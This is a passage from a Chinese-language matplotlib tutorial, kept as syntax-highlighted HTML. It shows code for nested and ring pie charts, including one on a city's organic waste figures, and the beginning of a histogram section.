class="token punctuation">)</span><span class="token comment">#定义颜色r/10.代表颜色与半径有关</span>bar<span class="token punctuation">.</span>set_alpha<span class="token punctuation">(</span><span class="token number">0.3</span><span class="token punctuation">)</span><span class="token comment">#定义不透明度，越小越透明</span>plt<span class="token punctuation">.</span>show<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="./python%E7%BB%98%E5%9B%BE%E5%8F%8A%E5%8F%AF%E8%A7%86%E5%8C%96%E5%A4%87%E8%AF%BE/Figure_19.png" alt=""></p><h3 id="拓展-多层嵌套饼图">拓展: 多层嵌套饼图</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> matplotlib <span class="token keyword">import</span> pyplot <span class="token keyword">as</span> plt<span class="token keyword">import</span> numpy <span class="token keyword">as</span> npsize <span class="token operator">=</span> <span class="token number">0.25</span>base <span class="token operator">=</span> <span class="token number">50</span>plt<span class="token punctuation">.</span>rcParams<span class="token punctuation">[</span><span class="token string">'font.family'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'SimHei'</span>fig<span class="token punctuation">,</span> ax <span class="token operator">=</span> plt<span class="token punctuation">.</span>subplots<span class="token punctuation">(</span>figsize<span class="token operator">=</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">)</span>vals_middle <span class="token operator">=</span> np<span class="token punctuation">.</span>array<span class="token punctuation">(</span><span class="token punctuation">[</span>    <span class="token punctuation">[</span><span class="token number">47.5</span><span class="token punctuation">,</span> <span class="token number">11.7</span><span class="token punctuation">,</span> <span class="token number">15.2</span><span class="token punctuation">,</span> <span class="token number">9.6</span><span class="token punctuation">]</span><span class="token punctuation">,</span>    <span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">44.8</span><span class="token punctuation">,</span> <span class="token number">7.5</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span>    <span class="token punctuation">[</span><span class="token number">9.2</span><span class="token punctuation">,</span> <span class="token number">68.5</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span>    <span class="token punctuation">[</span><span class="token number">1.2</span><span class="token punctuation">,</span> <span class="token number">7.2</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span>    <span class="token punctuation">[</span><span class="token number">80</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span>    <span class="token punctuation">[</span><span class="token number">1.7</span><span class="token punctuation">,</span> <span class="token number">18.9</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">)</span>vals_outer <span class="token operator">=</span> np<span class="token punctuation">.</span>array<span class="token punctuation">(</span><span class="token punctuation">[</span>    <span class="token punctuation">[</span><span class="token number">47.5</span><span class="token punctuation">,</span> <span class="token number">11.7</span><span class="token punctuation">,</span> <span class="token number">15.2</span><span class="token punctuation">,</span> <span class="token number">9.6</span><span class="token punctuation">]</span><span class="token punctuation">,</span>    <span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">36.6</span><span class="token punctuation">,</span> <span class="token number">8.2</span><span class="token punctuation">,</span> <span class="token number">7.5</span><span class="token punctuation">]</span><span class="token punctuation">,</span>    <span class="token punctuation">[</span><span class="token number">9.2</span><span class="token punctuation">,</span> <span class="token number">38.1</span><span class="token punctuation">,</span> <span class="token number">30.4</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span>    <span class="token punctuation">[</span><span class="token number">1.2</span><span class="token punctuation">,</span> <span class="token number">5.8</span><span class="token punctuation">,</span> <span class="token number">1.4</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span>    <span class="token punctuation">[</span><span class="token number">80</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span>    <span class="token punctuation">[</span><span class="token number">1.7</span><span class="token punctuation">,</span> <span class="token number">18.9</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">)</span>vals_inner <span class="token operator">=</span> vals_middle<span class="token punctuation">.</span><span class="token builtin">sum</span><span class="token punctuation">(</span>axis<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token comment"># 最内圈使用的数值为内圈各类数据加上base</span>vals_first <span class="token operator">=</span> vals_inner <span class="token operator">+</span> base<span class="token triple-quoted-string string">'''第二圈使用的数值, 因为最内圈每个类别都加上了base, 所以为了确保第二圈的数值和内圈相匹配, 第二圈的各类别要按照各自所占的比例分配各类的总数值.'''</span>vals_second <span class="token operator">=</span> np<span class="token punctuation">.</span>zeros<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    s_a <span class="token operator">=</span> vals_first<span class="token punctuation">[</span>i<span class="token punctuation">]</span>    s_b <span class="token operator">=</span> vals_middle<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token builtin">sum</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token comment"># 如果第二圈某类总数值为0, 则分配base.</span>    <span class="token keyword">if</span> s_b <span class="token operator">==</span> <span class="token number">0.0</span><span class="token punctuation">:</span>        vals_second<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> base        <span class="token keyword">continue</span>    <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        vals_second<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span>vals_middle<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">/</span> s_b<span class="token punctuation">)</span> <span class="token operator">*</span> s_a<span class="token comment"># 第三圈使用的数值, 和上方同理</span>vals_third <span class="token operator">=</span> np<span class="token punctuation">.</span>zeros<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    s_a <span class="token operator">=</span> vals_first<span class="token punctuation">[</span>i<span class="token punctuation">]</span>    s_b <span class="token operator">=</span> vals_outer<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token builtin">sum</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> s_b <span class="token operator">==</span> <span class="token number">0.0</span><span class="token punctuation">:</span>        vals_third<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> base        <span class="token keyword">continue</span>    <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        vals_third<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span>vals_outer<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">/</span> s_b<span class="token punctuation">)</span> <span class="token operator">*</span> s_a<span class="token comment"># 获取colormap tab20c和tab20b的颜色</span>cmap_c <span class="token operator">=</span> plt<span class="token punctuation">.</span>get_cmap<span class="token punctuation">(</span><span class="token string">"tab20c"</span><span class="token punctuation">)</span>cmap_b <span class="token operator">=</span> plt<span class="token punctuation">.</span>get_cmap<span class="token punctuation">(</span><span class="token string">"tab20b"</span><span class="token punctuation">)</span><span class="token comment"># 使用tab20c的全部颜色和tab20b中的 5至8 颜色</span>cmap_1 <span class="token operator">=</span> cmap_c<span class="token punctuation">(</span>np<span class="token punctuation">.</span>arange<span class="token punctuation">(</span><span class="token number">20</span><span class="token punctuation">)</span><span class="token punctuation">)</span>cmap_2 <span class="token operator">=</span> cmap_b<span class="token punctuation">(</span>np<span class="token punctuation">.</span>array<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">,</span> <span class="token number">7</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># 内圈的颜色是每4个颜色中色彩最深的那个. vstack是将两类颜色叠加在一起</span>inner_colors <span class="token operator">=</span> np<span class="token punctuation">.</span>vstack<span class="token punctuation">(</span><span class="token punctuation">(</span>cmap_1<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">,</span> cmap_2<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># 外圈的颜色是全部24种颜色</span>outer_colors <span class="token operator">=</span> np<span class="token punctuation">.</span>vstack<span class="token punctuation">(</span><span class="token punctuation">(</span>cmap_1<span class="token punctuation">,</span> cmap_2<span class="token punctuation">)</span><span class="token punctuation">)</span>labels_first <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">"餐厨废弃物\n&#123;&#125;万吨"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>vals_inner<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                <span class="token string">"农业秸秆\n&#123;&#125;万吨"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>vals_inner<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                <span class="token string">"水草\n151.2万吨"</span><span class="token punctuation">,</span>                <span class="token string">"园林绿化\n废弃物\n&#123;&#125;万吨"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>vals_inner<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                <span class="token string">"淤泥\n432.0万吨"</span><span class="token punctuation">,</span>                <span class="token string">"畜禽粪便\n21.6万吨"</span>                <span class="token punctuation">]</span>labels_seocnd <span class="token operator">=</span> <span class="token punctuation">[</span>    <span class="token string">"未分类收集\n67.6万吨"</span><span class="token punctuation">,</span>    <span class="token string">"生物干化\n3.7万吨"</span><span class="token punctuation">,</span>    <span class="token string">"厌氧发酵\n10.2万吨"</span><span class="token punctuation">,</span>    <span class="token string">"油水分离\n2.6万吨"</span><span class="token punctuation">,</span>    <span class="token string">""</span><span class="token punctuation">,</span>    <span class="token string">"粉碎\n46.8万吨"</span><span class="token punctuation">,</span>    <span class="token string">"好氧发酵\n3.5万吨"</span><span class="token punctuation">,</span>    <span class="token string">""</span><span class="token punctuation">,</span>    <span class="token string">"未处理\n4.2万吨"</span><span class="token punctuation">,</span>    <span class="token string">"藻水分离\n147.0万吨"</span><span class="token punctuation">,</span>    <span class="token string">""</span><span class="token punctuation">,</span>    <span class="token string">""</span><span class="token punctuation">,</span>    <span class="token string">"未处理\n1.2万吨"</span><span class="token punctuation">,</span>    <span class="token string">"粉碎\n7.2万吨"</span><span class="token punctuation">,</span>    <span class="token string">""</span><span class="token punctuation">,</span>    <span class="token string">""</span><span class="token punctuation">,</span>    <span class="token string">"堆放\n432.0万吨"</span><span class="token punctuation">,</span>    <span class="token string">""</span><span class="token punctuation">,</span>    <span class="token string">""</span><span class="token punctuation">,</span>    <span class="token string">""</span><span class="token punctuation">,</span>    <span class="token string">"未处理\n0.7万吨"</span><span class="token punctuation">,</span>    <span class="token string">"好氧发酵\n19.9万吨"</span><span class="token punctuation">,</span>    <span class="token string">""</span><span class="token punctuation">,</span>    <span class="token string">""</span><span class="token punctuation">,</span><span class="token punctuation">]</span>labels_third <span class="token operator">=</span> <span class="token punctuation">[</span>    <span class="token string">"未处理\n67.5万吨"</span><span class="token punctuation">,</span>    <span class="token string">"肥料化、发电\n3.7万吨"</span><span class="token punctuation">,</span>    <span class="token string">"沼气、沼渣发电\n10.2万吨"</span><span class="token punctuation">,</span>    <span class="token string">"焚烧\n2.6万吨"</span><span class="token punctuation">,</span>    <span class="token string">""</span><span class="token punctuation">,</span>    <span class="token string">"还田\n42.6万吨"</span><span class="token punctuation">,</span>    <span class="token string">"燃料化\n4.2万吨"</span><span class="token punctuation">,</span>    <span class="token string">"肥料化\n3.5万吨"</span><span class="token punctuation">,</span>    <span class="token string">"未利用\n4.2万吨"</span><span class="token punctuation">,</span>    <span class="token string">"燃料化\n80.2万吨"</span><span class="token punctuation">,</span>    <span class="token string">"肥料化\n66.8万吨"</span><span class="token punctuation">,</span>    <span class="token string">""</span><span class="token punctuation">,</span>    <span class="token string">"未利用\n1.2万吨"</span><span class="token punctuation">,</span>    <span class="token string">"肥料化\n5.8万吨"</span><span class="token punctuation">,</span>    <span class="token string">"燃料化\n1.4万吨"</span><span class="token punctuation">,</span>    <span class="token string">""</span><span class="token punctuation">,</span>    <span class="token string">"未利用\n432.0万吨"</span><span class="token punctuation">,</span>    <span class="token string">""</span><span class="token punctuation">,</span>    <span class="token string">""</span><span class="token punctuation">,</span>    <span class="token string">""</span><span class="token punctuation">,</span>    <span class="token string">"未利用\n0.7万吨"</span><span class="token punctuation">,</span>    <span class="token string">"肥料化\n19.9万吨"</span><span class="token punctuation">,</span>    <span class="token string">""</span><span class="token punctuation">,</span>    <span class="token string">""</span><span class="token punctuation">,</span><span class="token punctuation">]</span>handles<span class="token punctuation">,</span> labels <span class="token operator">=</span> ax<span class="token punctuation">.</span>pie<span class="token punctuation">(</span>vals_first<span class="token punctuation">,</span> radius<span class="token operator">=</span><span class="token number">1</span> <span class="token operator">-</span> size <span class="token operator">-</span> size<span class="token punctuation">,</span>                         labels<span class="token operator">=</span>labels_first<span class="token punctuation">,</span>                         labeldistance<span class="token operator">=</span><span class="token number">0.5</span><span class="token punctuation">,</span> rotatelabels<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span> textprops<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">'fontsize'</span><span class="token punctuation">:</span> <span class="token number">11</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span>                         colors<span class="token operator">=</span>inner_colors<span class="token punctuation">,</span> wedgeprops<span class="token operator">=</span><span class="token builtin">dict</span><span class="token punctuation">(</span>width<span class="token operator">=</span>size<span class="token punctuation">,</span> edgecolor<span class="token operator">=</span><span class="token string">'w'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>ax<span class="token punctuation">.</span>pie<span class="token punctuation">(</span>vals_second<span class="token punctuation">.</span>flatten<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> radius<span class="token operator">=</span><span class="token number">1</span> <span class="token operator">-</span> size<span class="token punctuation">,</span> colors<span class="token operator">=</span>outer_colors<span class="token punctuation">,</span>       labels<span class="token operator">=</span>labels_seocnd<span class="token punctuation">,</span>       labeldistance<span class="token operator">=</span><span class="token number">0.7</span><span class="token punctuation">,</span> rotatelabels<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span> textprops<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">'fontsize'</span><span class="token punctuation">:</span> <span class="token number">11</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span>       wedgeprops<span class="token operator">=</span><span class="token builtin">dict</span><span class="token punctuation">(</span>width<span class="token operator">=</span>size<span class="token punctuation">,</span> edgecolor<span class="token operator">=</span><span class="token string">'w'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>ax<span class="token punctuation">.</span>pie<span class="token punctuation">(</span>vals_third<span class="token punctuation">.</span>flatten<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> radius<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">,</span> colors<span class="token operator">=</span>outer_colors<span class="token punctuation">,</span>       labels<span class="token operator">=</span>labels_third<span class="token punctuation">,</span>       labeldistance<span class="token operator">=</span><span class="token number">0.8</span><span class="token punctuation">,</span> rotatelabels<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span> textprops<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">'fontsize'</span><span class="token punctuation">:</span> <span class="token number">11</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span>       wedgeprops<span class="token operator">=</span><span class="token builtin">dict</span><span class="token punctuation">(</span>width<span class="token operator">=</span>size<span class="token punctuation">,</span> edgecolor<span class="token operator">=</span><span class="token string">'w'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>plt<span class="token punctuation">.</span>title<span class="token punctuation">(</span><span class="token string">'某市有机废弃物产生、处理、利用情况'</span><span class="token punctuation">,</span> fontsize<span class="token operator">=</span><span class="token number">25</span><span class="token punctuation">)</span>plt<span class="token punctuation">.</span>legend<span class="token punctuation">(</span>handles<span class="token operator">=</span>handles<span class="token punctuation">,</span> labels<span class="token operator">=</span><span class="token punctuation">[</span>    <span class="token string">"餐厨废弃物"</span><span class="token punctuation">,</span>    <span class="token string">"农业秸秆"</span><span class="token punctuation">,</span>    <span class="token string">"水草"</span><span class="token punctuation">,</span>    <span class="token string">"园林绿化废弃物"</span><span class="token punctuation">,</span>    <span class="token string">"淤泥"</span><span class="token punctuation">,</span>    <span class="token string">"畜禽粪便"</span><span class="token punctuation">]</span><span class="token punctuation">,</span>           loc<span class="token operator">=</span><span class="token number">1</span>           <span class="token punctuation">)</span>plt<span class="token punctuation">.</span>show<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="./python%E7%BB%98%E5%9B%BE%E5%8F%8A%E5%8F%AF%E8%A7%86%E5%8C%96%E5%A4%87%E8%AF%BE/Figure_20.png" alt=""></p><p>这个例子来源于CSDN不是我自己写的，权拿过来做一个参考。</p><p>下面写个简单的</p><p>目前matplotlib的官方文档中尚无双层饼图绘制的专门介绍<s>我那个渣渣的英语即使有也多半找不到</s>，但是pie（）函数中有个饼图半径的设置<strong>radius</strong>，我们可以通过手动规定饼图半径，pie()由于是通过一层一层的堆叠，后面一层覆盖掉前面的层次，我们可以这样来实现两张图片的堆叠。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> matplotlib<span class="token punctuation">.</span>pyplot <span class="token keyword">as</span> pltvals1 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">]</span>vals2 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">]</span>fig<span class="token punctuation">,</span> ax <span class="token operator">=</span> plt<span class="token punctuation">.</span>subplots<span class="token punctuation">(</span><span class="token punctuation">)</span>labels <span class="token operator">=</span> <span class="token string">'A'</span><span class="token punctuation">,</span> <span class="token string">'B'</span><span class="token punctuation">,</span> <span class="token string">'C'</span><span class="token punctuation">,</span> <span class="token string">'D'</span>ax<span class="token punctuation">.</span>pie<span class="token punctuation">(</span>vals1<span class="token punctuation">,</span> radius<span class="token operator">=</span><span class="token number">1.2</span><span class="token punctuation">)</span>ax<span class="token punctuation">.</span>pie<span class="token punctuation">(</span>vals2<span class="token punctuation">,</span> radius<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span>ax<span class="token punctuation">.</span><span class="token builtin">set</span><span class="token punctuation">(</span>aspect<span class="token operator">=</span><span class="token string">"equal"</span><span class="token punctuation">)</span>plt<span class="token punctuation">.</span>show<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>进一步实现环图，这也是这个道理，使用一张纯白的饼图去覆盖上两张图片就能实现多层嵌套饼图</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> matplotlib<span class="token punctuation">.</span>pyplot <span class="token keyword">as</span> pltvals1 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">]</span>vals2 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">]</span>vals3 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>fig<span class="token punctuation">,</span> ax <span class="token operator">=</span> plt<span class="token punctuation">.</span>subplots<span class="token punctuation">(</span><span class="token punctuation">)</span>labels <span class="token operator">=</span> <span class="token string">'A'</span><span class="token punctuation">,</span> <span class="token string">'B'</span><span class="token punctuation">,</span> <span class="token string">'C'</span><span class="token punctuation">,</span> <span class="token string">'D'</span>ax<span class="token punctuation">.</span>pie<span class="token punctuation">(</span>vals1<span class="token punctuation">,</span> radius<span class="token operator">=</span><span class="token number">1.2</span><span class="token punctuation">)</span>ax<span class="token punctuation">.</span>pie<span class="token punctuation">(</span>vals2<span class="token punctuation">,</span> radius<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span>ax<span class="token punctuation">.</span>pie<span class="token punctuation">(</span>vals3<span class="token punctuation">,</span>colors<span class="token operator">=</span><span class="token string">'w'</span><span class="token punctuation">,</span>radius<span class="token operator">=</span><span class="token number">0.7</span><span class="token punctuation">)</span>ax<span class="token punctuation">.</span><span class="token builtin">set</span><span class="token punctuation">(</span>aspect<span class="token operator">=</span><span class="token string">"equal"</span><span class="token punctuation">)</span>plt<span class="token punctuation">.</span>show<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="./python%E7%BB%98%E5%9B%BE%E5%8F%8A%E5%8F%AF%E8%A7%86%E5%8C%96%E5%A4%87%E8%AF%BE/Figure_31.png" alt=""></p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> matplotlib<span class="token keyword">import</span> matplotlib<span class="token punctuation">.</span>pyplot <span class="token keyword">as</span> pltmatplotlib<span class="token punctuation">.</span>rcParams<span class="token punctuation">[</span><span class="token string">'font.family'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string">'SimHei'</span>vals1 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">]</span>vals2 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">]</span>vals3<span class="token operator">=</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>fig<span class="token punctuation">,</span> ax <span class="token operator">=</span> plt<span class="token punctuation">.</span>subplots<span class="token punctuation">(</span><span class="token punctuation">)</span>labels <span class="token operator">=</span> <span class="token string">'A'</span><span class="token punctuation">,</span> <span class="token string">'B'</span><span class="token punctuation">,</span> <span class="token string">'C'</span><span class="token punctuation">,</span> <span class="token string">'D'</span>ax<span class="token punctuation">.</span>pie<span class="token punctuation">(</span>vals1<span class="token punctuation">,</span> radius<span class="token operator">=</span><span class="token number">1.2</span><span class="token punctuation">,</span>autopct<span class="token operator">=</span><span class="token string">'%1.1f%%'</span><span class="token punctuation">,</span>pctdistance<span class="token operator">=</span><span class="token number">0.9</span><span class="token punctuation">)</span>ax<span class="token punctuation">.</span>pie<span class="token punctuation">(</span>vals2<span class="token punctuation">,</span> radius<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">,</span>autopct<span class="token operator">=</span><span class="token string">'%1.1f%%'</span><span class="token punctuation">,</span>pctdistance<span class="token operator">=</span><span class="token number">0.75</span><span class="token punctuation">)</span>ax<span class="token punctuation">.</span>pie<span class="token punctuation">(</span>vals3<span class="token punctuation">,</span> radius<span class="token operator">=</span><span class="token number">0.6</span><span class="token punctuation">,</span>colors<span class="token operator">=</span><span class="token string">'w'</span><span class="token punctuation">)</span>ax<span class="token punctuation">.</span><span class="token builtin">set</span><span class="token punctuation">(</span>aspect<span class="token operator">=</span><span class="token string">"equal"</span><span class="token punctuation">,</span> title<span class="token operator">=</span><span class="token string">'多层嵌套饼图'</span><span class="token punctuation">)</span><span class="token comment">#plt.legend()</span>plt<span class="token punctuation">.</span>legend<span class="token punctuation">(</span>labels<span class="token punctuation">,</span>bbox_to_anchor<span class="token operator">=</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span> loc<span class="token operator">=</span><span class="token string">'best'</span><span class="token punctuation">,</span> borderaxespad<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">.</span><span class="token punctuation">)</span>plt<span class="token punctuation">.</span>show<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="./python%E7%BB%98%E5%9B%BE%E5%8F%8A%E5%8F%AF%E8%A7%86%E5%8C%96%E5%A4%87%E8%AF%BE/Figure_32.png" alt=""></p><h2 id="5-7-直方图">5.7 直方图</h2><p>在数据分析应用中，直方图是一种对数据分布情况进行表达的数据可视化形式，其横坐标通常表示统计样本，纵坐标表示某个样本对应的某个属性的度量值。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">plt<span class="token punctuation">.</span>hist<span class="token punctuation">(</span>x<span class="token punctuation">,</span> bins<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">,</span> density<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">,</span>…<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> numpy <span class="token keyword">as</span> np<span class="token keyword">import</span> matplotlib<span class="token punctuation">.</span>pyplot <span class="token keyword">as</span> pltfigure <span class="token operator">=</span> plt<span class="token punctuation">.</span>figure<span class="token punctuation">(</span><span class="token punctuation">)</span>axes1 <span class="token operator">=</span> figure<span class="token punctuation">.</span>add_subplot<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span>axes2 <span class="token operator">=</span> figure<span 